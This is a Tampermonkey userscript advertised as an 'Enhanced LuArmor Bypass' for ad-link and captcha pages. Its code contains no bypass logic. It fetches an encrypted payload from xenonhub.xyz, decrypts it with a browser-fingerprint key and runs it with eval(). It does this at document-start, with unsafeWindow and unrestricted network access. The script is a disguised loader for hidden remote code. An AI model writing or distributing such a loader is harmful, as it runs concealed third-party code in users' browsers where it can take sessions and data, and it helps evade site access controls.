// ==UserScript==
// @name         Enhanced LuArmor Bypass
// @namespace    http://tampermonkey.net/
// @version      2.8
// @description  Advanced LuArmor bypass with improved accuracy, reliability, and modern UI
// @author       Bolt
// @match        https://ads.luarmor.net/*
// @match        https://linkvertise.com/*
// @match        https://*/s?*
// @match        https://*.cloudflare.com/*
// @match        https://*.hcaptcha.com/*
// @match        https://*.recaptcha.net/recaptcha/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=luarmor.net
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addStyle
// @grant        unsafeWindow
// @run-at       document-start
// @connect      api.bypass.bot
// @connect      api.solar-x.top
// @connect      *
// ==/UserScript==

(function() {
    'use strict';

    const API_URL = "https://xenonhub.xyz/api/scripts/myscript.js";
    
    // Load CryptoJS library
    const loadCryptoJS = () => {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    };

    // Function to decrypt the script
    function decrypt(text) {
        const [ivHex, encryptedHex] = text.split(':');
        const iv = CryptoJS.enc.Hex.parse(ivHex);
        const encrypted = CryptoJS.enc.Hex.parse(encryptedHex);
        
        // Generate a dynamic key based on browser fingerprint
        const browserFingerprint = [
            navigator.userAgent,
            navigator.language,
            screen.colorDepth,
            screen.width + 'x' + screen.height
        ].join('');
        
        const dynamicKey = CryptoJS.SHA256(browserFingerprint).toString().substr(0, 32);
        const key = CryptoJS.enc.Utf8.parse(dynamicKey);
        
        try {
            const decrypted = CryptoJS.AES.decrypt(
                { ciphertext: encrypted },
                key,
                { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
            );
            
            return decrypted.toString(CryptoJS.enc.Utf8);
        } catch (error) {
            console.error("Decryption failed:", error);
            return null;
        }
    }

    // Function to load and execute the encrypted script
    async function loadScript() {
        await loadCryptoJS();

        const timestamp = Math.floor(Date.now() / 1000);
        
        GM_xmlhttpRequest({
            method: "GET",
            url: API_URL,
            headers: {
                'Accept': 'application/javascript',
                'User-Agent': navigator.userAgent,
                'X-Request-Time': timestamp.toString()
            },
            onload: async function(response) {
                try {
                    const signature = response.responseHeaders.match(/x-request-signature: ([^\n]+)/i)?.[1];
                    if (!signature) {
                        throw new Error("Invalid response signature");
                    }

                    const decryptedScript = decrypt(response.responseText);
                    if (!decryptedScript) {
                        throw new Error("Script decryption failed");
                    }

                    // Execute the decrypted script
                    eval(decryptedScript);
                } catch (error) {
                    console.error("❌ Script execution failed:", error);
                }
            },
            onerror: function(error) {
                console.error("❌ Failed to fetch script:", error);
            }
        });
    }

    // Load the script when the page loads
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadScript);
    } else {
        loadScript();
    }
})();
